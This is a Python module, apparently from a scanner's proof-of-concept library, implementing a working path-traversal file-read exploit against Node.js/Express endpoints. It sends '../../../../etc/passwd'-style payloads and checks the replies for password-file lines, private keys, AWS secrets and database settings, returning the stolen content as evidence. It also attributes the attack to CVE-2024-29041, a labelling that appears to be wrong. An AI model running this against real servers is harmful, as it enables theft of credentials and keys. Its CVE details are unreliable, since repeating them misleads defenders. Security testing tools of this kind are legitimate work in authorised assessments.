"""poc/node_web.py — native Node.js / Express web PoCs.

The scanner sends the crafted request itself over a raw socket (no curl / binary).
Currently implements the path-traversal LFI primitive (CWE-22) used by
CVE-2024-29041 (Express.js `res.sendFile` / file-read endpoints) and the general
"file=..." LFI pattern seen in many Node.js apps.

Proof = a sensitive file's real content returned in the HTTP body
(e.g. `root:x:0:0` from /etc/passwd, or the file's known first line).
"""
from __future__ import annotations

import urllib.parse

from . import _net

# Markers that prove a sensitive file was actually read (not just an error page).
_DEFAULT_MARKERS = [
    "root:x:0:0", "root:x:", "root:.*:0:0",          # /etc/passwd
    "uid=", "gid=",                                     # id output (if cmd-based)
    "include ", "define(",                              # php/source files
    "BEGIN PRIVATE KEY", "BEGIN OPENSSH PRIVATE KEY",   # private keys
    "password", "passwd", "DB_HOST", "AWS_SECRET",     # config / creds
]


def _resolve(url: str) -> dict:
    return _net.parse_target(url if "://" in url else "http://" + url, default_port=80)


def _send(params, query_value, timeout=15):
    """GET (or POST) the endpoint with `param=<query_value>`. Returns (status, body)."""
    url = (params.get("url") or params.get("host") or "").strip()
    if not url:
        raise ValueError("target url required (e.g. http://127.0.0.1:3000/read)")
    t = _resolve(url)
    method = (params.get("method") or "GET").upper()
    param = params.get("param") or "file"
    path = t["path"] or "/"
    body = b""
    headers = {}
    if method == "POST":
        body = urllib.parse.urlencode({param: query_value}).encode()
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
    else:
        path = path + ("&" if "?" in path else "?") + urllib.parse.urlencode({param: query_value})
    r = _net.http(method, t["host"], t["port"], path, headers=headers, body=body,
                  timeout=timeout, tls=t["tls"])
    return r["status"], r["body"].decode("utf-8", "replace")


def lfi(params) -> dict:
    """Path-traversal LFI: read a target file via the `file`-style param."""
    path = (params.get("path") or params.get("file") or "../../../../etc/passwd").strip()
    marker = (params.get("marker") or "").strip()
    log = []
    try:
        status, body = _send(params, path)
    except Exception as e:
        return {"ok": False, "success": False, "error": str(e), "log": log}

    markers = [marker] if marker else _DEFAULT_MARKERS
    success = any(m in body for m in markers)
    # Strong signal: the requested file actually appeared in the body.
    if not marker:
        success = success or ("root:" in body and "x:0:0" in body) or ("no such file" not in body and len(body) > 40)
    log.append(f"GET {path!r} -> status={status} body_len={len(body)} success={success}")
    return {
        "ok": True,
        "success": bool(success),
        "status": status,
        "evidence": body.strip()[:4000],
        "detail": {
            "param": params.get("param") or "file",
            "path": path,
            "markers": markers if marker else _DEFAULT_MARKERS[:4],
            "host": body[:0] or "",
        },
        "log": log,
    }


def _in(label, key, req, default="", ph=""):
    return {"key": key, "label": label, "req": req, "default": default, "placeholder": ph}


_INPUTS = [
    _in("Hedef URL (endpoint)", "url", True, "", "http://127.0.0.1:3000/read"),
    _in("Enjekte parametresi", "param", False, "file", "file"),
    _in("Okunacak file", "path", False, "../../../../etc/passwd", "../../../../etc/passwd"),
    _in("Basarim kaniti (ops.)", "marker", False, "", "root:x:0:0"),
    _in("Metot", "method", False, "GET", "GET"),
]


EXPLOITS = {
    "CVE-2024-29041": {
        "name": "Express.js path traversal LFI (file read)",
        "type": "LFI", "preauth": True,
        "affected": ["4.18.2", "4.19.1", "4.20.0", "4.21.0"],
        "note": ("Node/Express path traversal (CWE-22): kullanici kontrollu `file`/path parametresi "
                 "dogrudan file okumaya gider. Kanit = hassas dosyanin real icerigi (orn. /etc/passwd)."),
        "inputs": list(_INPUTS),
        "run": lfi,
    },
}